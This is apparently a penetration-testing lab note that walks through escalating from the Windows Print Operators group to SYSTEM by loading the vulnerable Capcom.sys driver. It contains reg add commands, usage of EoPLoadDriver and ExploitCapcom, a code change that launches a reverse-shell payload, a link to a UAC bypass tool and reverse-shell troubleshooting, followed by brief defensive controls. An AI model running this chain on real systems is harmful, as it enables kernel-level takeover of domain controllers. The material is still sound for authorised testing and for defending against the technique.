## Overview

`Print Operators` is a highly privileged built-in Windows group.

Members of this group can:

- manage printers connected to a Domain Controller
- create printers
- share printers
- delete printers
- log on locally to a Domain Controller
- shut down a Domain Controller
- use `SeLoadDriverPrivilege`

The privilege relevant to escalation is:

```text
SeLoadDriverPrivilege
```

`SeLoadDriverPrivilege` allows a user to load and unload device drivers. If a vulnerable kernel driver can be loaded, it may be possible to execute code in kernel context and escalate to:

```text
NT AUTHORITY\SYSTEM
```

> [!warning]
> Loading drivers is a high-impact action. A bad or unstable driver can crash the system.

---

# Why Print Operators Matters

`Print Operators` membership can expose dangerous local privileges on Domain Controllers and Windows servers.

The most important abuse path in this workflow is:

```text
Print Operators membership → SeLoadDriverPrivilege → load vulnerable driver → exploit driver → SYSTEM
```

The vulnerable driver used in this example is:

```text
Capcom.sys
```

`Capcom.sys` is a known vulnerable driver that exposes functionality allowing user-mode code to execute shellcode with SYSTEM privileges.

---

# Important Version Limitation

> [!important]
> Since Windows 10 Version 1803, this specific `SeLoadDriverPrivilege` abuse technique is no longer exploitable using registry references under `HKEY_CURRENT_USER`.
>
> The older technique relies on loading a driver using a registry path under:
>
> ```text
> HKCU\System\CurrentControlSet
> ```
>
> Modern Windows versions prevent this specific `HKCU`-based driver-loading abuse path.

This does not mean `SeLoadDriverPrivilege` is harmless. It means this exact workflow depends on OS version and driver-loading behavior.

# Handling UAC / Elevation

If the account is a member of `Print Operators` but `SeLoadDriverPrivilege` is not visible, use one of the following authorized paths:

- open an elevated command prompt from the GUI using the Print Operators account credentials
- obtain an elevated shell through an approved UAC bypass technique
- use another permitted escalation path to get a high-integrity token

UAC can filter administrator-style privileges from a medium-integrity shell. The privilege may exist for the account but not appear until the user is running in an elevated context.

https://github.com/hfiref0x/UACME

# Attack Concept – Load and Exploit Capcom.sys

## Why Capcom.sys Works

`Capcom.sys` is a vulnerable signed driver. Once loaded, it exposes functionality that can be abused to execute attacker-controlled shellcode in kernel mode.

The typical exploitation chain is:

1. Enable `SeLoadDriverPrivilege`.
2. Register a driver service path in the registry.
3. Load `Capcom.sys`.
4. Use `ExploitCapcom.exe` to interact with the vulnerable driver.
5. Steal or duplicate a SYSTEM token.
6. Launch a process as SYSTEM.

---

C:\Tools\Capcom.sys

EnableSeLoadDriverPrivilege.exe

This helper enables `SeLoadDriverPrivilege` in the current token and attempts to load the driver.

# Method 1 – Manual Capcom.sys Exploitation

## Attack Flow

1. Confirm the account has `SeLoadDriverPrivilege`.
2. Obtain an elevated context if UAC hides the privilege.
3. Compile `EnableSeLoadDriverPrivilege.exe`.
4. Place `Capcom.sys` on the target.
5. Add the driver registry values under `HKCU`.
6. Confirm the driver is not already loaded.
7. Run `EnableSeLoadDriverPrivilege.exe`.
8. Confirm `Capcom.sys` loaded.
9. Run `ExploitCapcom.exe`.
10. Confirm SYSTEM execution.
11. Clean up registry keys and artifacts.

---

Download the `EnableSeLoadDriverPrivilege.cpp` source locally.

Before compiling, ensure the include section contains:

These headers provide the required Windows API, native API, security descriptor, and character-handling definitions needed by the code.

# Step 3 – Place Capcom.sys on the Target

Save the vulnerable driver to a writable path on the target.

Example:

```text
C:\Tools\Capcom.sys
```

Make sure the path used in the registry matches the actual location of the driver.

---

# Step 4 – Add Registry Reference to the Driver

Windows loads drivers based on service-style registry configuration.

Create a driver service key under the current user hive:

```cmd
reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"
```

```cmd
reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
```

Example output:

```cmd
C:\htb> reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"

The operation completed successfully.

C:\htb> reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1

The operation completed successfully.
```

## Registry Value Breakdown

| Value | Meaning |
|---|---|
| `ImagePath` | Path to the driver file |
| `Type` | Driver type |
| `REG_DWORD /d 1` | Kernel driver service type |

## NT Object Path Prefix

The prefix:

```text
\??\
```

is an NT Object Manager path prefix.

It allows the Win32 path to be resolved correctly by the lower-level Windows APIs used during driver loading.

Example:

```text
\??\C:\Tools\Capcom.sys
```

resolves to the driver file at:

```text
C:\Tools\Capcom.sys
```

# Alternate Exploitation – No GUI

## When to Use

The default `ExploitCapcom.exe` behavior launches:

```text
C:\Windows\system32\cmd.exe
```

This is useful with GUI access or an interactive desktop session.

If there is no GUI, launching a visible command prompt may not help. In that case, modify the exploit to launch a payload that works from a non-GUI context.

Examples:

- reverse shell executable
- bind shell executable
- command-execution payload
- add-user payload
- file write / beacon-style payload, if authorized

---

# Modify ExploitCapcom.cpp

Find the `LaunchShell()` function.

Original code:

```c
// Launches a command shell process
static bool LaunchShell()
{
    TCHAR CommandLine[] = TEXT("C:\\Windows\\system32\\cmd.exe");

    PROCESS_INFORMATION ProcessInfo;
    STARTUPINFO StartupInfo = { sizeof(StartupInfo) };

    if (!CreateProcess(CommandLine, CommandLine, nullptr, nullptr, FALSE,
        CREATE_NEW_CONSOLE, nullptr, nullptr, &StartupInfo,
        &ProcessInfo))
    {
        return false;
    }

    CloseHandle(ProcessInfo.hThread);
    CloseHandle(ProcessInfo.hProcess);
    return true;
}
```

Replace the command line with the payload path.

Example:

```c
TCHAR CommandLine[] = TEXT("C:\\ProgramData\\revshell.exe");
```

Compile the modified exploit and place the payload at:

```text
C:\ProgramData\revshell.exe
```

Then execute:

```powershell
.\ExploitCapcom.exe
```

If the payload is a reverse shell, start the listener before running the exploit.

> [!tip]
> Use a payload type that matches the engagement rules, network conditions, and available egress paths.

# Method 2 – Automating Driver Loading with EoPLoadDriver

## Why Use EoPLoadDriver

`EoPLoadDriver` simplifies the setup by automating:

- enabling `SeLoadDriverPrivilege`
- creating the required registry key
- calling `NTLoadDriver`
- loading the driver

This avoids manually creating the registry values and running a separate privilege-enabling loader.

---

# Run EoPLoadDriver

```cmd
EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys
```

Example output:

```cmd
C:\htb> EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys

[+] Enabling SeLoadDriverPrivilege
[+] SeLoadDriverPrivilege Enabled
[+] Loading Driver: \Registry\User\S-1-5-21-454284637-3659702366-2958135535-1103\System\CurrentControlSet\Capcom
NTSTATUS: c000010e, WinError: 0
```

Then run the exploit:

```powershell
.\ExploitCapcom.exe
```

If `ExploitCapcom.exe` was modified, it will execute the configured custom payload instead of launching `cmd.exe`.

# Troubleshooting

## SeLoadDriverPrivilege is missing

Possible causes:

- user is not in `Print Operators`
- current shell is not elevated
- UAC is filtering the token
- wrong user context
- group membership has not applied to the current logon session

---

## SeLoadDriverPrivilege is present but disabled

This is expected.

Enable it in the current token before loading the driver.

---

## Registry values are created but driver does not load

Check:

- `Capcom.sys` exists at the configured path
- `ImagePath` uses the correct `\??\` prefix
- `Type` is set to `1`
- shell is elevated
- privilege is enabled
- OS version still supports this `HKCU` method
- driver signing / blocklist policy is not preventing the load

---

## DriverView does not show Capcom.sys

Possible causes:

- load failed
- exported driver list is stale
- wrong search pattern
- driver blocked by the OS
- endpoint protection prevented loading

---

## ExploitCapcom does not launch SYSTEM shell

Check:

- `Capcom.sys` is loaded
- exploit binary architecture matches the target
- endpoint protection did not block execution
- exploit was compiled correctly
- shell launch is possible in the current session
- modified payload path is correct

---

## Reverse shell payload does not connect

Check:

- listener is running
- payload architecture matches the target
- firewall allows outbound traffic
- IP and port are correct
- payload path matches the modified source
- endpoint protection did not quarantine the payload
- network segmentation does not block the connection

# Defensive Notes

## Risks

`Print Operators` can be dangerous because members may have:

- local logon rights to Domain Controllers
- shutdown rights on Domain Controllers
- printer management rights on Domain Controllers
- `SeLoadDriverPrivilege`

`SeLoadDriverPrivilege` is especially sensitive because vulnerable driver loading can cross the boundary from local privileged operations into kernel-level code execution.

---

## Defensive Controls

Consider:

- removing unnecessary `Print Operators` members
- auditing all privileged built-in group memberships
- monitoring `SeLoadDriverPrivilege` usage
- monitoring driver load events
- blocking known vulnerable drivers
- enabling Microsoft vulnerable driver blocklists
- restricting local logon to Domain Controllers
- auditing registry paths used for driver loading
- alerting on suspicious `reg add` operations under driver service paths
- monitoring execution of tools such as `ExploitCapcom.exe` and `EoPLoadDriver.exe`
- enforcing least privilege for printer administration

---

# Key Takeaways

- `Print Operators` is a high-risk group, especially on Domain Controllers.
- Members may receive `SeLoadDriverPrivilege`.
- `SeLoadDriverPrivilege` allows loading and unloading drivers.
- `Capcom.sys` is a vulnerable driver that can be abused to execute shellcode as SYSTEM.
- UAC may hide `SeLoadDriverPrivilege` until an elevated context is obtained.
- The manual attack path uses registry driver configuration, privilege enabling, driver loading, and driver exploitation.
- `ExploitCapcom.exe` can launch a SYSTEM shell once `Capcom.sys` is loaded.
- Without GUI access, modify the exploit to launch a payload such as `C:\ProgramData\revshell.exe`.
- `EoPLoadDriver` can automate privilege enabling and driver loading.
- Since Windows 10 Version 1803, the `HKCU` registry reference method is no longer exploitable.
- Cleanup should remove registry keys, copied driver files, compiled tooling, and payload artifacts.
